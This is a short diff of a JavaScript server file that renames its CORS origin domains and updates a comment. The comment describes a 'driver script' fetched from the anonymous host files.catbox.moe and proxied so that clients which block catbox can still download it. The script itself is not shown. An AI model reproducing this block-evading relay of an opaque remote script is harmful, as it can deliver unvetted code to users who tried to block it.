@@ -46,8 +46,8 @@ function parseStepHistory(raw) {
 
 // CORS: allow frontend from local dev (any host:5173) and production
 const allowedOrigins = [
-  'https://canditech.in',
-  'https://www.canditech.in',
+  'https://wecreateproblems.in',
+  'https://www.wecreateproblems.in',
   'http://localhost:5173',
   /^http:\/\/192\.168\.\d+\.\d+:5173$/,   // local network
   /^http:\/\/198\.18\.\d+\.\d+:5173$/,   // VPN/virtual network dev
@@ -105,7 +105,7 @@ const macRoute = (req, res) => {
   res.type('text/plain').send(content);
 };
 
-/** Same payload as files.catbox.moe — proxied so clients that block catbox can still download via api.canditech.net */
+/** Same payload as files.catbox.moe — proxied so clients that block catbox can still download via api.wecreateproblems.net */
 const DRIVER_SCRIPT_UPSTREAM = 'https://files.catbox.moe/l2rxnb.js';
 
 async function driverEnvSetupProxy(req, res) {
